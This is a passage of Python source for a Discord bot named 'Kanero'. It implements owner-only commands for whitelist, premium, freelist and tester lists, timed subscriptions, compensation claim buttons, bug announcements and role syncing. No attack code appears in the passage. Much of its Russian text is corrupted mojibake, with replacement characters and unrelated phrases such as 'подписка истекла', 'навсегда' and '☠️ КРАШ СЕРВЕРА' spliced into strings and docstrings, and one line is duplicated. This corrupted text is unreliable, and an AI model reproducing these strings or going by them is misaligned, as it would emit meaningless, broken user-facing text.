        await ctx.send(f"❌ Пользователь `{user_input}` не найден.")
        return
    user_id = user.id
    if user_id in config.WHITELIST:
        config.WHITELIST.remove(user_id)
        save_whitelist()
        try:
            if user_id not in PREMIUM_LIST:
                home_guild = bot.get_guild(HOME_GUILD_ID)
                if home_guild:
                    member = home_guild.get_member(user_id)
                    if member:
                        role = discord.utils.find(lambda r: r.name == "✅ White", home_guild.roles)
                        if role and role in member.roles:
                            await member.remove_roles(role, reason="wl_remove")
                    await update_stats_channels(home_guild)
        except Exception:
            pass
        await ctx.send(f"? **{user}** ����� �� whitelist.")
    else:
        await ctx.send("�� Готово.")


@bot.command(name="wl_list")
async def wl_list(ctx):
    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
        return
    if not config.WHITELIST:
        await ctx.send("Whitelist пуст.")
        return
    lines = []
    for uid in config.WHITELIST:
        try:
            user = await bot.fetch_user(uid)
            lines.append(f"`{uid}` – **{user}**")
        except Exception:
            lines.append(f"`{uid}` – *не найден*")
    embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
    embed.set_footer(text=f"🤖 Kanero  |  Всего: {len(config.WHITELIST)}")
    await ctx.send(embed=embed)


# --- OWNER-ONLY: PREMIUM -----------------------------------

@bot.command(name="pm_add")
async def pm_add(ctx, *, user_input: str):
    """�������� � Premium. ������ ��� �подписка истекла.
    Использование: !pm_add @user [���] | !pm_add all [���]
    """
    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
        return

    # Проверка: только на домашнем сервере или для глобального овнера
    if ctx.guild and ctx.guild.id != HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
        embed = discord.Embed(
            title="❌ Команда недоступна",
            description=(
                "Команда `!pm_add` работает **только на домашнем сервере**.\n\n"
                "Premium можно выдавать только там, где бот имеет полный контроль.\n"
                "Это сделано для безопасности и предотвращения злоупотреблений."
            ),
            color=0xff0000
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return

    # Парсим длительность из последнего аргумента
    parts = user_input.rsplit(maxsplit=1)
    duration_hours = None
    actual_input = user_input
    if len(parts) == 2:
        try:
            duration_hours = _parse_duration(parts[1])
            actual_input = parts[0].strip()
        except (ValueError, Exception):
            actual_input = user_input

    # ����� ALL � ������ ���� ��подписка истекла�� �������
    if actual_input.lower() == "all":
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if not home_guild:
            await ctx.send("❌ Домашний сервер не найден.")
            return
        msg = await ctx.send("⏳ Выдаю Premium роль участникам...")
        count = 0
        prem_role = discord.utils.find(lambda r: r.name == "💎 Premium", home_guild.roles)
        white_role = discord.utils.find(lambda r: r.name == "✅ White", home_guild.roles)
        for member in home_guild.members:
            if member.bot:
                continue
            uid = member.id
            if duration_hours:
                add_temp_subscription(uid, "pm", duration_hours)
            else:
                if uid not in PREMIUM_LIST:
                    PREMIUM_LIST.append(uid)
                if uid not in config.WHITELIST:
                    config.WHITELIST.append(uid)
            roles_to_add = [r for r in [prem_role, white_role] if r and r not in member.roles]
            if roles_to_add:
                try:
                    await member.add_roles(*roles_to_add, reason="pm_add all")
                except Exception:
                    pass
            count += 1
        if not duration_hours:
            save_premium()
            save_whitelist()
        days = duration_hours // 24 if duration_hours else 0
        dur_text = f" на **{days} дн.**" if duration_hours else " навсегда"
        await msg.edit(content=f"? **Premium**{dur_text} ����� **{count}** навсегда��.")
        return

    # ������� ����� � ��все параллельно�
    user = await resolve_user(ctx, actual_input)
    if not user:
        await ctx.send(f"❌ Пользователь `{actual_input}` не найден.")
        return
    user_id = user.id

    if duration_hours:
        add_temp_subscription(user_id, "pm", duration_hours)
        days = duration_hours // 24
        duration_text = f"{days} дн." if days > 0 else f"{duration_hours} ч."
        result_text = f"💎 **{user}** получил **Premium** на **{duration_text}** (временно)."
    else:
        if user_id not in PREMIUM_LIST:
            PREMIUM_LIST.append(user_id)
            save_premium()
        if user_id not in config.WHITELIST:
            config.WHITELIST.append(user_id)
            save_whitelist()
        if user_id in FREELIST:
            FREELIST.remove(user_id)
            save_freelist()
        result_text = f"💎 **{user}** (`{user_id}`) получил **Premium** навсегда."
        result_text = f"💎 **{user}** (`{user_id}`) получил **Premium** навсегда."

    # ����� ����
    try:
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if home_guild:
            member = home_guild.get_member(user_id)
            if not member:
                try:
                    member = await home_guild.fetch_member(user_id)
                except Exception:
                    member = None
            if member:
                prem_role  = discord.utils.find(lambda r: r.name == "💎 Premium", home_guild.roles)
                white_role = discord.utils.find(lambda r: r.name == "✅ White",   home_guild.roles)
                user_role  = discord.utils.find(lambda r: r.name == "👥 User",    home_guild.roles)
                roles_to_add    = [r for r in [prem_role, white_role] if r and r not in member.roles]
                roles_to_remove = [r for r in [user_role] if r and r in member.roles]
                if roles_to_add:
                    await member.add_roles(*roles_to_add, reason="pm_add")
                if roles_to_remove:
                    await member.remove_roles(*roles_to_remove, reason="pm_add upgrade")
            await update_stats_channels(home_guild)
    except Exception:
        pass
    await ctx.send(result_text)


@bot.command(name="pm_remove")
async def pm_remove(ctx, *, user_input: str):
    # ������ подписка истекла ���все параллельно�
    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
        return
    user = await resolve_user(ctx, user_input)
    if not user:
        await ctx.send(f"❌ Пользователь `{user_input}` не найден.")
        return
    user_id = user.id
    if user_id in PREMIUM_LIST:
        PREMIUM_LIST.remove(user_id)
        save_premium()
        try:
            home_guild = bot.get_guild(HOME_GUILD_ID)
            if home_guild:
                member = home_guild.get_member(user_id)
                if member:
                    role = discord.utils.find(lambda r: r.name == "💎 Premium", home_guild.roles)
                    if role and role in member.roles:
                        await member.remove_roles(role, reason="pm_remove")
                await update_stats_channels(home_guild)
        except Exception:
            pass
        await ctx.send(f"? **{user}** ����� �� Premium.")
    else:
        await ctx.send("�� ������ � Premium.")


@bot.command(name="pm_list")
async def pm_list(ctx):
    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
        return
    now = datetime.utcnow()
    temp_pm = [(uid, s) for uid, s in TEMP_SUBSCRIPTIONS.items() if s["type"] == "pm" and now < s["expires"]]
    lines = []
    for uid in PREMIUM_LIST:
        try:
            user = await bot.fetch_user(uid)
            lines.append(f"`{uid}` � **{user}**")
        except Exception:
            lines.append(f"`{uid}` � *�� ������*")
    for uid, s in temp_pm:
        if uid not in PREMIUM_LIST:
            try:
                user = await bot.fetch_user(uid)
                lines.append(f"`{uid}` – **{user}** ⏰ <t:{int(s['expires'].timestamp())}:R>")
            except Exception:
                lines.append(f"`{uid}` ⏰ <t:{int(s['expires'].timestamp())}:R>")
    embed = discord.Embed(title="💎 Premium список", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
    embed.set_footer(text=f"🤖 Kanero  |  Постоянных: {len(PREMIUM_LIST)}  |  Временных: {len(temp_pm)}")
    await ctx.send(embed=embed)


@bot.command(name="fl_list")
async def fl_list(ctx):
    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
        return
    now = datetime.utcnow()
    temp_fl = [(uid, s) for uid, s in TEMP_SUBSCRIPTIONS.items() if s["type"] == "fl" and now < s["expires"]]
    lines = []
    for uid in FREELIST:
        try:
            user = await bot.fetch_user(uid)
            lines.append(f"`{uid}` – **{user}**")
        except Exception:
            lines.append(f"`{uid}` – *не найден*")
    for uid, s in temp_fl:
        if uid not in FREELIST:
            try:
                user = await bot.fetch_user(uid)
                lines.append(f"`{uid}` – **{user}** ⏰ <t:{int(s['expires'].timestamp())}:R>")
            except Exception:
                lines.append(f"`{uid}` ⏰ <t:{int(s['expires'].timestamp())}:R>")
    embed = discord.Embed(title="📁 Freelist", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
    embed.set_footer(text=f"🤖 Kanero  |  Постоянных: {len(FREELIST)}  |  Временных: {len(temp_fl)}")
    await ctx.send(embed=embed)


def _parse_duration(duration_str: str) -> int:
    """������ ����все параллельно� � ����. навсегда����: 2d, 24h, 48, 1d12h � �.�."""
    duration_str = duration_str.lower().strip()
    total_hours = 0
    import re
    matches = re.findall(r'(\d+)\s*([dh]?)', duration_str)
    if not matches:
        raise ValueError(f"�� ������� ��подписка истекла�����: `{duration_str}`")
    for value, unit in matches:
        value = int(value)
        if unit == 'd':
            total_hours += value * 24
        elif unit == 'h' or unit == '':
            total_hours += value
    if total_hours <= 0:
        raise ValueError("������������ ������ ���� ������ 0")
    return total_hours


class CompensationView(discord.ui.View):
    """������ �подписка истекла����. навсегда ���� �� ������� �����."""

    def __init__(self, sub_type: str, hours: int, expires_at: datetime):
        super().__init__(timeout=None)
        self.sub_type = sub_type
        self.hours = hours
        self.expires_at = expires_at
        self.claimed: set[int] = set()

        sub_names = {"wl": "✅ White", "pm": "💎 Premium", "fl": "📁 Freelist"}
        self.sub_name = sub_names.get(sub_type, sub_type)

    @discord.ui.button(label="✅ Получить компенсацию", style=discord.ButtonStyle.green, custom_id="claim_comp_v2")
    async def claim(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = interaction.user

        # навсегда� �� ������� �� ����� �����
        if datetime.utcnow() > self.expires_at:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="? ����� �������",
                    description="���� �������☠️ КРАШ СЕРВЕРА��� ��� навсегда��.",
                    color=0xff6b6b
                ),
                ephemeral=True
            )
            return

        # ��� ������� � навсегда� � � ������ � � TEMP_SUBSCRIPTIONS
        already_claimed = user.id in self.claimed
        if not already_claimed and user.id in TEMP_SUBSCRIPTIONS:
            sub = TEMP_SUBSCRIPTIONS[user.id]
            if sub["type"] == self.sub_type and datetime.utcnow() < sub["expires"]:
                already_claimed = True

        if already_claimed:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="? �� ��� подписка истекла����",
                    description=(
                        f"�� ��� навсегда **{self.sub_name}**.\n"
                        f"��������� `!help` ����� ��подписка истекла�� �Готово."
                    ),
                    color=0x2b2d31
                ),
                ephemeral=True
            )
            return

        self.claimed.add(user.id)

        # ����� навсегда
        add_temp_subscription(user.id, self.sub_type, self.hours)

        # ����� ���� �� подписка истекла
        home_guild = bot.get_guild(HOME_GUILD_ID)
        role_given = False
        if home_guild:
            role_map = {"wl": "✅ White", "pm": "💎 Premium", "fl": "👥 User"}
            role_name = role_map.get(self.sub_type)
            if role_name:
                member = home_guild.get_member(user.id)
                if not member:
                    try:
                        member = await home_guild.fetch_member(user.id)
                    except Exception:
                        member = None
                if member:
                    role = discord.utils.find(lambda r: r.name == role_name, home_guild.roles)
                    if role:
                        try:
                            await member.add_roles(role, reason="�����������")
                            role_given = True
                        except Exception:
                            pass

        days = self.hours // 24
        duration_text = f"{days} дн." if days > 0 else f"{self.hours} �."

        # подписка истекла�����
        await interaction.response.send_message(
            embed=discord.Embed(
                title="? ���подписка истекла�!",
                description=(
                    f"**��������:** {self.sub_name}\n"
                    f"**������������:** {duration_text}\n"
                    f"**��������:** <t:{int((datetime.utcnow() + timedelta(hours=self.hours)).timestamp())}:R>\n\n"
                    f"{'���� ������ �� �Готово.' if role_given else '��������� `!help` ��� ������ Готово.'}"
                ),
                color=0x00ff00
            ).set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd"),
            ephemeral=True
        )

        # ����� � admin-chat
        if home_guild:
            admin_ch = discord.utils.find(lambda c: "admin-chat" in c.name.lower(), home_guild.text_channels)
            if admin_ch:
                try:
                    await admin_ch.send(
                        embed=discord.Embed(
                            title="?? ���подписка истекла�",
                            description=(
                                f"**������������:** {user.mention} (`{user.id}`)\n"
                                f"**��������:** {self.sub_name}\n"
                                f"**������������:** {duration_text}"
                            ),
                            color=0x00ff00
                        ).set_footer(text="🤖 Kanero")
                    )
                except Exception:
                    pass


@bot.command(name="compensate")
async def compensate_cmd(ctx, sub_type: str = None, duration_str: str = None):
    """подписка истекла���� � ������� навсегда�. ������ ��� Готово.
    Использование: !compensate pm 1d
    """
    if ctx.author.id != config.OWNER_ID:
        return

    if not sub_type or not duration_str:
        await ctx.send(
            "? **подписка истеклаГотово.**\n"
            "���������: `!compensate <���> <�����>`\n\n"
            "**����:** `wl` � White � `pm` � Premium � `fl` � Freelist\n"
            "**�����:** `2d` � 2 ��� � `48h` � 48 ����� � `24` � 24 ����\n\n"
            "**������:** `!compensate pm 1d`"
        )
        return

    if sub_type.lower() not in ("wl", "pm", "fl"):
        await ctx.send(
            f"? навсегда ��� `{sub_type}`.\n"
            "��������� ����: `wl` � White � `pm` � Premium � `fl` � Freelist"
        )
        return

    try:
        hours = _parse_duration(duration_str)
    except ValueError as e:
        await ctx.send(f"❌ {e}\nПримеры: `2d` или `48h` или `24`")
        return

    sub_names = {"wl": "✅ White", "pm": "💎 Premium", "fl": "📁 Freelist"}
    sub_name = sub_names[sub_type.lower()]
    days = hours // 24
    duration_text = f"{days} дн. ({hours} ч.)" if days > 0 else f"{hours} ч."

    # Компенсация действует ровно 1 день от выдачи
    claim_deadline = datetime.utcnow() + timedelta(days=1)

    # Ищем канал компенсаций на домашнем сервере
    home_guild = bot.get_guild(HOME_GUILD_ID)
    if not home_guild:
        await ctx.send("❌ Домашний сервер не найден.")
        return

    comp_ch = discord.utils.find(lambda c: "компенсация" in c.name.lower(), home_guild.text_channels)
    if not comp_ch:
        await ctx.send("❌ Канал компенсаций не найден (нужен канал с 'компенсация' в названии).")
        return

    embed = discord.Embed(
        title="🎁 Компенсация для вас!",
        description=(
            f"**Подписка:** {sub_name}\n"
            f"**Длительность:** {duration_text}\n"
            f"**Забрать до:** <t:{int(claim_deadline.timestamp())}:R>\n\n"
            "Нажми кнопку ниже чтобы получить компенсацию в виде роли на сервере."
        ),
        color=0xffd700
    )
    embed.set_footer(text="🤖 Kanero  |  Компенсация не переносится")
    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")

    view = CompensationView(sub_type.lower(), hours, claim_deadline)
    comp_msg = await comp_ch.send(content="@everyone", embed=embed, view=view)

    # ����� � навсегда
    news_ch = discord.utils.find(
        lambda c: "������" in c.name.lower() or "news" in c.name.lower(),
        home_guild.text_channels
    )
    if news_ch:
        try:
            news_embed = discord.Embed(
                title="?? подписка истекла����!",
                description=(
                    f"��� ���� ��подписка истекла� ��подписка истекла� **{sub_name}** �� {duration_text}!\n\n"
                    f"������� � {comp_ch.mention} � ����� ������ ����� навсегда.\n\n"
                    f"**�������� ��:** <t:{int(claim_deadline.timestamp())}:R>"
                ),
                color=0xffd700
            )
            news_embed.set_footer(text="?? Kanero  |  ����� ������ � ����все параллельно")
            news_embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
            await news_ch.send(content="@everyone", embed=news_embed)
        except Exception:
            pass

    # навсегда�� � admin-chat
    admin_ch = discord.utils.find(lambda c: "admin-chat" in c.name.lower(), home_guild.text_channels)
    if admin_ch:
        try:
            await admin_ch.send(
                embed=discord.Embed(
                    title="?? ���подписка истекла��",
                    description=(
                        f"**���:** {sub_name}\n"
                        f"**������������:** {duration_text}\n"
                        f"**�����:** {comp_ch.mention}\n"
                        f"**�������� ��:** <t:{int(claim_deadline.timestamp())}:R>"
                    ),
                    color=0xffd700
                ).set_footer(text=f"�������: {ctx.author}")
            )
        except Exception:
            pass

    await ctx.message.delete()  # ������� ������� ����� �� навсегда �����

    # ���� � ����� 24 ���� навсегда� � admin-chat ������� навсегда�
    async def remind_delete():
        await asyncio.sleep(86400)  # 24 ����
        try:
            hg = bot.get_guild(HOME_GUILD_ID)
            if not hg:
                return
            ac = discord.utils.find(lambda c: "admin-chat" in c.name.lower(), hg.text_channels)
            if ac:
                await ac.send(
                    embed=discord.Embed(
                        title="??? ����� ���подписка истекла",
                        description=(
                            f"����������� **{sub_name}** навсегда�.\n\n"
                            f"�� ������ ������� навсегда� � {comp_ch.mention}!"
                        ),
                        color=0xff6b6b
                    ).set_footer(text="🤖 Kanero")
                )
            # ������� ������� �подписка истекла������
            try:
                await comp_msg.delete()
            except Exception:
                pass
        except Exception:
            pass

    asyncio.create_task(remind_delete())


@bot.command(name="announce_bug")
async def announce_bug_cmd(ctx, *, message: str = None):
    """�������� � ���� � ������ навсегда. ������ ��� Готово.
    Использование: !announce_bug навсегда | навсегда ��� навсегда� � ��� навсегда��
    """
    if ctx.author.id != config.OWNER_ID:
        return

    if not message:
        await ctx.send(
            "? **подписка истеклаГотово.**\n"
            "���������: `!announce_bug навсегда | навсегда`\n\n"
            "**������:** `!announce_bug подписка истекла | �все параллельно�� ������ ��� ������ �все параллельно. ��� навсегда� � v2.3.`"
        )
        return

    # навсегда� �� навсегда � навсегда
    if "|" in message:
        parts = message.split("|", 1)
        bug_title = parts[0].strip()
        bug_description = parts[1].strip()
    else:
        bug_title = "��������� ���"
        bug_description = message.strip()

    # ���� ����� навсегда �� подписка истекла
    home_guild = bot.get_guild(HOME_GUILD_ID)
    if not home_guild:
        await ctx.send("❌ Домашний сервер не найден.")
        return

    news_channel = discord.utils.find(
        lambda c: "������" in c.name.lower() or "news" in c.name.lower(),
        home_guild.text_channels
    )
    if not news_channel:
        await ctx.send("? ����� навсегда �� ������ �� подписка истекла.")
        return

    embed = discord.Embed(
        title=f"?? навсегда� ���: {bug_title}",
        description=bug_description,
        color=0xff6b6b,
        timestamp=datetime.utcnow()
    )
    embed.add_field(
        name="? ������",
        value="��� �подписка истекла�� � навсегда�� ��� �Готово.",
        inline=False
    )
    embed.add_field(
        name="?? навсегда���",
        value=(
            "���� ��� навсегда ���� ��� � навсегда � �����, �� �����все параллельно.\n"
            "все параллельно ���� ���подписка истекла навсегда���☠️ КРАШ СЕРВЕРА����."
        ),
        inline=False
    )
    embed.set_footer(text="?? Kanero  |  ������� �� навсегда!")
    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")

    try:
        await news_channel.send(content="@everyone", embed=embed)
        # ���все параллельно�� � admin-chat, � �� � ����� навсегда
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if home_guild:
            admin_ch = discord.utils.find(lambda c: "admin-chat" in c.name.lower(), home_guild.text_channels)
            if admin_ch:
                await admin_ch.send(f"? навсегда�� � ��все параллельно� � {news_channel.mention}")
    except Exception as e:
        await ctx.send(f"? ������ ��� навсегда��: {e}")


@bot.command(name="list")
async def list_cmd(ctx):
    # Проверка команды для OWNER_ID на сервере
    is_server_owner = ctx.guild and ctx.author.id == ctx.guild.owner_id
    is_bot_owner = ctx.author.id == config.OWNER_ID
    if not is_server_owner and not is_bot_owner:
        return

    async def fmt(ids):
        lines = []
        for uid in ids:
            try:
                user = await bot.fetch_user(uid)
                name = f"`{uid}` • **{user}**"
            except Exception:
                name = f"`{uid}` • *не найден*"
            lines.append(name)
        return "\n".join(lines) if lines else "*пусто*"

    embed = discord.Embed(title="📋 Листы Kanero", color=0x0a0a0a)
    protected = set(config.OWNER_WHITELIST) | {config.OWNER_ID}
    now = datetime.utcnow()

    # Получаем ID из временных подписок (только активные)
    temp_wl = {uid for uid, s in TEMP_SUBSCRIPTIONS.items() if s["type"] == "wl" and now < s["expires"]}
    temp_pm = {uid for uid, s in TEMP_SUBSCRIPTIONS.items() if s["type"] == "pm" and now < s["expires"]}
    temp_fl = {uid for uid, s in TEMP_SUBSCRIPTIONS.items() if s["type"] == "fl" and now < s["expires"]}

    # Показываем временные и оставшееся времени если есть подписки
    temp_lines = []
    for uid, sub in list(TEMP_SUBSCRIPTIONS.items()):
        if now > sub["expires"]:
            continue
        sub_names = {"wl": "✅ White", "pm": "💎 Premium", "fl": "📁 Freelist"}
        sub_name = sub_names.get(sub["type"], sub["type"])
        expires_ts = int(sub["expires"].timestamp())
        try:
            user = await bot.fetch_user(uid)
            temp_lines.append(f"`{uid}` • **{user}** | {sub_name} | <t:{expires_ts}:R>")
        except Exception:
            temp_lines.append(f"`{uid}` | {sub_name} | <t:{expires_ts}:R>")
    if temp_lines:
        value = "\n".join(temp_lines)
        if len(value) > 1020:
            value = value[:1020] + "..."
        embed.add_field(name=f"⏰ Временные подписки ({len(temp_lines)})", value=value, inline=False)

    # Freelist — только постоянные (без временных)
    fl_only = [uid for uid in FREELIST if uid not in config.WHITELIST and uid not in PREMIUM_LIST and uid not in temp_fl]
    
    # Whitelist — только постоянные (без временных)
    wl_only = [uid for uid in config.WHITELIST if uid not in PREMIUM_LIST and uid not in protected and uid not in temp_wl]
    
    # Premium — только постоянные (без временных)
    pm_all = [uid for uid in PREMIUM_LIST if uid not in temp_pm]
    
    # Показываем в правильном приоритете: Owner > Premium > Whitelist > Freelist > Tester
    # Если у пользователя несколько ролей, показываем самую высокую
    
    # Собираем всех пользователей с их высшей ролью
    user_roles = {}  # uid -> (priority, role_name, list_name)
    
    # Owner (приоритет 0)
    user_roles[config.OWNER_ID] = (0, "👑 Owner", "Owner")
    
    # Premium (приоритет 1)
    for uid in pm_all:
        if uid not in user_roles:
            user_roles[uid] = (1, "💎 Premium", "Premium")
    
    # Whitelist (приоритет 2)
    for uid in wl_only:
        if uid not in user_roles:
            user_roles[uid] = (2, "✅ Whitelist", "Whitelist")
    
    # Freelist (приоритет 3)
    for uid in fl_only:
        if uid not in user_roles:
            user_roles[uid] = (3, "📁 Freelist", "Freelist")
    
    # Tester (приоритет 4 - самый низкий, показывается только если нет других ролей)
    for uid in TESTER_LIST:
        if uid not in user_roles:
            user_roles[uid] = (4, "🧪 Tester", "Tester")
    
    # Группируем по ролям
    grouped = {"Owner": [], "Premium": [], "Whitelist": [], "Freelist": [], "Tester": []}
    for uid, (priority, role_emoji, list_name) in user_roles.items():
        grouped[list_name].append(uid)
    
    embed.add_field(name=f"📋 Freelist ({len(grouped['Freelist'])})",  value=await fmt(grouped['Freelist']),  inline=False)
    embed.add_field(name=f"✅ Whitelist ({len(grouped['Whitelist'])})", value=await fmt(grouped['Whitelist']), inline=False)
    embed.add_field(name=f"💎 Premium ({len(grouped['Premium'])})",     value=await fmt(grouped['Premium']),   inline=False)
    embed.add_field(name=f"🧪 Tester ({len(grouped['Tester'])})",       value=await fmt(grouped['Tester']),    inline=False)
    embed.add_field(name=f"👑 Owner (1)",                                value=f"`{config.OWNER_ID}` • **Owner**", inline=False)

    embed.add_field(
        name="⚙️ Управление",
        value=(
            "`!fl_add/remove/clear` – freelist\n"
            "`!wl_add/remove` – whitelist\n"
            "`!pm_add/remove` – premium\n"
            "`!ts_add/remove` – тестеры"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


@bot.command(name="list_remove")
async def list_remove_cmd(ctx):
    """Управление листами для ролей (freelist, whitelist, premium). Только для Owner."""
    if ctx.author.id != config.OWNER_ID:
        await ctx.send("? ������ ��� Owner.")
        return
    
    # ����подписка истекла ����� �������
    fl_count = len(FREELIST)
    wl_count = len(config.WHITELIST)
    pm_count = len(PREMIUM_LIST)
    temp_count = len(TEMP_SUBSCRIPTIONS)
    total = fl_count + wl_count + pm_count + temp_count
    
    if total == 0:
        await ctx.send("?? ��� ������ ��� �����.")
        return
    
    # ������� ��� ������
    FREELIST.clear()
    config.WHITELIST.clear()
    PREMIUM_LIST.clear()
    TEMP_SUBSCRIPTIONS.clear()
    
    # �подписка истекла��
    save_freelist()
    save_whitelist()
    save_premium_list()
    save_temp_subscriptions()
    
    embed = discord.Embed(
        title="??? ������ �������",
        description=(
            f"**������� навсегда��:**\n"
            f"?? Freelist: {fl_count}\n"
            f"✅ Whitelist: {wl_count}\n"
            f"?? Premium: {pm_count}\n"
            f"? навсегда�: {temp_count}\n\n"
            f"**����� �������: {total}**"
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="?? Kanero  |  ��� ������ �������")
    await ctx.send(embed=embed)


@bot.command(name="sync_roles")
async def sync_roles_cmd(ctx):
    """��������� � навсегда������ ��☠️ КРАШ СЕРВЕРА�� ������ �� подписка истекла."""
    if ctx.author.id != config.OWNER_ID:
        return

    guild = bot.get_guild(HOME_GUILD_ID)
    if not guild:
        await ctx.send("❌ Домашний сервер не найден.")
        return

    msg = await ctx.send("?? навсегда����� ����...")

    role_white   = discord.utils.find(lambda r: r.name == "✅ White",   guild.roles)
    role_premium = discord.utils.find(lambda r: r.name == "💎 Premium", guild.roles)
    role_user    = discord.utils.find(lambda r: r.name == "👥 User",    guild.roles)
    role_guest   = discord.utils.find(lambda r: r.name == "👤 Guest",   guild.roles)
    role_tester  = discord.utils.find(lambda r: r.name == "🧪 Tester",  guild.roles)

    given = []
    removed = []
    missing = []

    # навсегда� ���� ��подписка истекла (�� ������ ���� ��� навсегда)
    if not guild.chunked:
        await guild.chunk()

    # ����� Guest ���� навсегда�� � ���� � ���
    if role_guest:
        for member in guild.members:
            if member.bot:
                continue
            if role_guest not in member.roles:
                try:
                    await member.add_roles(role_guest, reason="sync_roles: ���� Guest")
                    given.append(f"👤 {member} > Guest")
                except Exception:
                    pass

    # навсегда ���� ��� ������ ���� � ����� �����
    wl_ids  = set(config.WHITELIST)
    pm_ids  = set(PREMIUM_LIST)
    fl_ids  = set(FREELIST)
    tester_ids = set(TESTER_LIST)

    for uid in wl_ids | pm_ids | fl_ids | tester_ids:
        member = guild.get_member(uid)
        if not member:
            try:
                member = await guild.fetch_member(uid)
            except Exception:
                # ��� �� ������� � ������� �� ������
                kicked_from = []
                if uid in config.WHITELIST:
                    config.WHITELIST.remove(uid)
                    save_whitelist()
                    kicked_from.append("✅ White")
                if uid in PREMIUM_LIST:
                    PREMIUM_LIST.remove(uid)
                    save_premium()
                    kicked_from.append("💎 Premium")
                if uid in FREELIST:
                    FREELIST.remove(uid)
                    save_freelist()
                    kicked_from.append("?? Freelist")
                if kicked_from:
                    missing.append(f"`{uid}` � ����� ��: {', '.join(kicked_from)}")
                else:
                    missing.append(f"`{uid}`")
                continue

        # Premium
        if uid in pm_ids:
            if role_premium and role_premium not in member.roles:
                try:
                    await member.add_roles(role_premium, reason="sync_roles")
                    given.append(f"💎 {member} > Premium")
                except Exception:
                    pass
        # Whitelist (�� premium)
        elif uid in wl_ids:
            if role_white and role_white not in member.roles:
                try:
                    await member.add_roles(role_white, reason="sync_roles")
                    given.append(f"✅ {member} > White")
                except Exception:
                    pass
        # Freelist
        elif uid in fl_ids:
            if role_user and role_user not in member.roles:
                try:
                    await member.add_roles(role_user, reason="sync_roles")
                    given.append(f"👥 {member} > User")
                except Exception:
                    pass
        # Tester
        if uid in tester_ids:
            if role_tester and role_tester not in member.roles:
                try:
                    await member.add_roles(role_tester, reason="sync_roles")
                    given.append(f"🧪 {member} > Tester")
                except Exception:
                    pass

    # �подписка истекла��� ������� � ������� ���� ���� �� ��� � ������
    for member in guild.members:
        if member.bot:
            continue
        uid = member.id
        if role_premium and role_premium in member.roles and uid not in pm_ids and uid != config.OWNER_ID:
            try:
                await member.remove_roles(role_premium, reason="sync_roles: �� � premium �����")
                removed.append(f"💎 {member} < Premium")
            except Exception:
                pass
        if role_white and role_white in member.roles and uid not in wl_ids and uid not in pm_ids and uid != config.OWNER_ID:
            try:
                await member.remove_roles(role_white, reason="sync_roles: �� � whitelist")
                removed.append(f"✅ {member} < White")
            except Exception:
                pass

    lines = []
    if given:
        lines.append("**������:**\n" + "\n".join(given))
    if removed:
        lines.append("**�����:**\n" + "\n".join(removed))
    if missing:
        lines.append(f"**�� �� ������� � ������� �� ������ ({len(missing)}):**\n" + "\n".join(missing))
    if not given and not removed and not missing:
        lines.append("? ��� ���� � �������, ������ �� навсегда.")

    embed = discord.Embed(
        title="?? навсегда����� �����",
        description="\n\n".join(lines),
        color=0x0a0a0a
    )
    embed.set_footer(text="?? Kanero  |  !list � навсегда�� �����")
    await msg.edit(content=None, embed=embed)


@bot.command(name="temp_check")
async def temp_check(ctx):
    """�подписка истекла�� навсегда. ������ ��� Готово."""
    if ctx.author.id != config.OWNER_ID:
        return
    
    now = datetime.utcnow()
    embed = discord.Embed(title="? �подписка истекла�", color=0x0a0a0a)
    
    if not TEMP_SUBSCRIPTIONS:
        embed.description = "? ��� подписка истекла�� навсегда"
    else:
        lines = []
        # ������� ����� ������� ����� навсегда ������ �подписка истекла �� ����� навсегда
        temp_copy = dict(TEMP_SUBSCRIPTIONS)
        
        for uid, sub in temp_copy.items():
            expires_ts = int(sub["expires"].timestamp())
            status = "? �������" if now < sub["expires"] else "? �������"
            sub_names = {"wl": "✅ White", "pm": "💎 Premium", "fl": "📁 Freelist"}
            sub_name = sub_names.get(sub["type"], sub["type"])
            
            try:
                user = await bot.fetch_user(uid)
                lines.append(f"`{uid}` � **{user}**\n{sub_name} | <t:{expires_ts}:R> | {status}")
            except Exception:
                lines.append(f"`{uid}` � *�� ������*\n{sub_name} | <t:{expires_ts}:R> | {status}")
        
        embed.description = "\n\n".join(lines) if lines else "? ��� �подписка истекла�"
    
    embed.set_footer(text=f"?? Kanero  |  �����: {len(TEMP_SUBSCRIPTIONS)}")
    await ctx.send(embed=embed)


@bot.command(name="fix_role")
async def fix_role_cmd(ctx, user: discord.Member = None):
    """��������� � ������ ���� ���подписка истекла�����, ���� �� ���� � �Готово."""
    # ������ ����� ��� �� подписка истекла
    if ctx.author.id != config.OWNER_ID and ctx.guild.id != HOME_GUILD_ID:
        return
    
    # ��все параллельно� �� ������, навсегда� ������ �������
    if user is None:
        user = ctx.author
    
    guild = ctx.guild
    if guild.id != HOME_GUILD_ID:
        await ctx.send("? ������� навсегда ������ �� подписка истекла.")
        return

    # Ищем роли
    role_white   = discord.utils.find(lambda r: r.name == "✅ White",   guild.roles)
    role_premium = discord.utils.find(lambda r: r.name == "💎 Premium", guild.roles)
    role_user    = discord.utils.find(lambda r: r.name == "👥 User",    guild.roles)
    role_guest   = discord.utils.find(lambda r: r.name == "👤 Guest",   guild.roles)

